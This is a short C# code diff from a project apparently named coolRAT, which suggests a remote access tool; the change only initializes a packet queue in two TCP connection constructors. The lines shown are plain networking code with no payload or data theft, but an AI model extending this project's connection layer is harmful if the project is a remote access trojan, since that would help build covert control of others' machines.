@@ -19,11 +19,13 @@ namespace coolRAT.Libs.Connections
         {
             ConnectTimeout = connectTimeout;
             Client = new TcpClient();
+            PacketQueue = new List<Packet>();
         }
         public TcpConnection(TcpClient client, int connectTimeout = 10000)
         {
             ConnectTimeout = connectTimeout;
             Client = client;
+            PacketQueue = new List<Packet>();
         }
        
         public bool Connect(string Host, int Port)
